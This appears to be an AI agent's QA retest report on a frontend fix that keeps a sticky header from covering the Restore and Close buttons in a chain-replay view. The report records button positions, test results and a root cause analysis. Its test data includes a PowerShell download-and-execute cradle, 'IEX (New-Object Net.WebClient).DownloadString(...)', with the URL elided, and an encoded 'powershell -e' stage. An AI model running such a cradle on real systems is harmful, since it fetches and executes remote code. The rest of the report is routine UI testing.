summary: Retest of the sticky-header overlay fix on ChainReplayView. All 4 flows PASS with real mouse clicks (no force, no synthetic .click()). Top RESTORE/CLOSE buttons now sit at y=103 (safely below the ~90px sticky header offset applied via window.scrollTo in rehydrateFromHistory + scrollMarginTop:80 on the card root). Bottom duplicate RESTORE/CLOSE buttons render at y=550, are hit-testable, and functional. elementFromPoint at every button center returns the BUTTON itself (isSelfOrChild=true) — no more HEADER interception. Restore-to-workspace correctly unmounts the replay and mounts ChainStageEditor with the 2 stages pre-populated (Stage 0: 'powershell -e ZQBjAGgAbwAgAGgAaQA=', Stage 1: 'IEX (New-Object Net.WebClient).DownloadString(...)'). Close correctly unmounts the replay.
critical_code_review_comments: Pre-existing hydration warning: <span> child of <option> in ai-provider dropdown at WorkspacePage.jsx:761 (unrelated to this fix). Should be cleaned up eventually.
WorkspacePage.jsx still 1372 lines — over the 700-line soft limit. Consider extracting useChainReplay hook.

Fix is clean and minimal: (a) scrollMarginTop:80 on ChainReplayView root, (b) replaced scrollIntoView with window.scrollTo(rect.top + scrollY - 90) in rehydrateFromHistory, (c) duplicate action row at bottom of card with -bottom suffixed testids. Handlers reuse the same onRestore/onClose props — no logic duplication.

success_rate.frontend: 100% — all 4 button flows (top-restore, top-close, bottom-restore, bottom-close) pass with real mouse clicks

rca of the issue: Iter_5 issue was root-caused to setTimeout scrollIntoView({block:'start'}) placing the card-head at y=13 behind the ~40px fixed HEADER. Main agent fixed by (1) offsetting scroll target: window.scrollTo(top - 90) instead of scrollIntoView, (2) belt-and-suspenders scrollMarginTop:80 on the card root, (3) adding a duplicate action row at bottom of the aggregate section as a safety net. Verified: card-head buttons now render at y=103 with elementFromPoint returning the button (no HEADER interception), and real mouse clicks succeed on all 4 buttons.
